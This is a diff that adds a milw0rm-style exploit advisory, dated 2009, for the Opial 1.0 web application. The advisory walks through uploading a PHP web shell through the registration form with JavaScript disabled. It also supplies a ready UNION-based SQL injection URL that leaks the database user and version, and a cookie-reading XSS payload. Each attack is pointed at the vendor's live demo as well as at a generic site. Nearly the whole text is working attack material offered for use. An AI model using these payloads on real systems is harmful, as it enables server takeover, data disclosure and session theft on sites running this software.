@@ -1,0 +1,39 @@
+::::::::::::::::::::R3AL.RU::::::::::::::::::::
+
+Opial 1.0 Arbitrary File Upload & XSS & SQL Injection (genres_parent)
+
+Author: LMaster
+
+Greetz: r3al.ru
+
+Official Site (with demo):
+
+http://www.opial.com
+
+-->Arbitrary File Upload<--
+
+1. Go to http://www.site.com/register.php
+2. Disable JavaScript
+3. Upload shell as "User Image"
+4. Register
+5. Shell location: http://www.site.com/userimages/SHELL.PHP
+
+-->SQL Injection<--
+
+http://www.site.com/home.php?genres_parent=-1%20union/**/select/**/1,concat(user(),%27%20%27,version()),3,4,5,6--
+
+-->XSS<--
+
+http://www.site.com/home.php?genres_parent="><script>alert(document.cookie);</script>
+
+Demo:
+
+http://www.opial.com/demo/register.php
+
+http://www.opial.com/demo/home.php?genres_parent=-1%20union/**/select/**/1,concat(user(),%27%20%27,version()),3,4,5,6--
+
+http://www.opial.com/demo/home.php?genres_parent=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+LMaster.
+
+# milw0rm.com [2009-07-11]
